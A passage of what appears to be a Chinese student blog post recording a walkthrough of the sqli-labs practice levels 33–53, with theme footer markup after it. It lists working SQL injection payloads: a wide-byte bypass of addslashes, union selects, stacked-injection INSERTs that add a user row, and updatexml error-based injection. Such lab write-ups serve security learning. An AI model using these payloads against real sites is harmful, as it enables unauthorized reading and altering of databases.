+<h3 id="Less-33"><a href="#Less-33" class="headerlink" title="Less 33"></a>Less 33</h3><p>提示绕过addslashes()<br>addslashes()：返回在预定义字符（引号，反斜杠）之前添加反斜杠的字符串。<br>与Less 32同</p>
+<h3 id="Less-34（写不出来）"><a href="#Less-34（写不出来）" class="headerlink" title="Less 34（写不出来）"></a>Less 34（写不出来）</h3><p>改为POST，与上差不多，但跑不出来</p>
+<h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less 35"></a>Less 35</h3><p>这里没有引号闭合和任何过滤，直接输入联合注入语句即可</p>
+<h3 id="Less-36"><a href="#Less-36" class="headerlink" title="Less 36"></a>Less 36</h3><p>转义字符</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\x00</span> <span class="hljs-string">\n</span> <span class="hljs-string">\r</span> <span class="hljs-string">\</span> <span class="hljs-string">&#x27; &quot; \x1a</span><br></code></pre></td></tr></table></figure>
+<p>可以用相同方法绕过</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=-<span class="hljs-number">1</span>%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database() <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+<h3 id="Less-37"><a href="#Less-37" class="headerlink" title="Less 37"></a>Less 37</h3><p>改为post型，大体与上同</p>
+<h2 id="Page-3"><a href="#Page-3" class="headerlink" title="Page 3"></a>Page 3</h2><h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less 38"></a>Less 38</h3><p>需要堆叠注入，即通过将多条语句通过；隔开写在一起构成多语句</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-number">666</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>) --+<br></code></pre></td></tr></table></figure>
+<h3 id="Less-39"><a href="#Less-39" class="headerlink" title="Less 39"></a>Less 39</h3><p>不用闭合直接注入</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-number">666</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+<h3 id="Less-40"><a href="#Less-40" class="headerlink" title="Less 40"></a>Less 40</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1&#x27;);<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-number">666</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>) --+<br></code></pre></td></tr></table></figure>
+<h3 id="Less-41"><a href="#Less-41" class="headerlink" title="Less 41"></a>Less 41</h3><p>添加了盲注，先延时注入判断字段名再使用堆叠注入即可</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-number">666</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+<h3 id="Less-42"><a href="#Less-42" class="headerlink" title="Less 42"></a>Less 42</h3><p>POST型，密码处报错，单引号闭合，注入点在密码栏<br>点击注册账号，提示为堆叠注入需创造新账号<br>在密码栏处输入联合注入语句获得字段等信息后进行堆叠注入</p>
+<h3 id="Less-43"><a href="#Less-43" class="headerlink" title="Less 43"></a>Less 43</h3><p>将闭合改为<code>&#39;)</code>余下相同</p>
+<h3 id="Less-44"><a href="#Less-44" class="headerlink" title="Less 44"></a>Less 44</h3><p>改为盲注，单引号闭合，余下类似</p>
+<h3 id="Less-45"><a href="#Less-45" class="headerlink" title="Less 45"></a>Less 45</h3><p>盲注，闭合<code>&#39;)</code>，同上</p>
+<h3 id="Less-46"><a href="#Less-46" class="headerlink" title="Less 46"></a>Less 46</h3><p>输入sort的值，说明与order by拼接<br>输入4，存在报错语句，采用报错注入</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">?<span class="hljs-built_in">sort</span>=<span class="hljs-number">4</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0x7e</span>,database(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+<h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less 47"></a>Less 47</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?<span class="hljs-built_in">sort</span>=<span class="hljs-number">4</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,database(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) --+<br></code></pre></td></tr></table></figure>
+<h3 id="Less-48-amp-49"><a href="#Less-48-amp-49" class="headerlink" title="Less 48 &amp; 49"></a>Less 48 &amp; 49</h3><p>两题均为盲注，均可使用延时注入</p>
+<h3 id="Less-50-amp-51"><a href="#Less-50-amp-51" class="headerlink" title="Less 50 &amp; 51"></a>Less 50 &amp; 51</h3><p>两题均有报错信息，考虑报错注入</p>
+<h3 id="Less-52-amp-53"><a href="#Less-52-amp-53" class="headerlink" title="Less 52 &amp; 53"></a>Less 52 &amp; 53</h3><p>无回显，选择盲注</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_13927568/5830763">https://blog.51cto.com/u_13927568/5830763</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/wang_624/article/details/101913584">https://blog.csdn.net/wang_624/article/details/101913584</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2023/07/16：夏令营week1记录:sql-lab</div>
+      <div>http://example.com/2023/07/16/sql-lab/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>July 16, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/07/16/week1plus/" title="2023/07/15：夏令营week1记录:出题">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2023/07/15：夏令营week1记录:出题</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/07/13/mysql%E7%AC%94%E8%AE%B0/" title="2023/07/10：夏令营week1记录:mysql笔记">
+                        <span class="hidden-mobile">2023/07/10：夏令营week1记录:mysql笔记</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
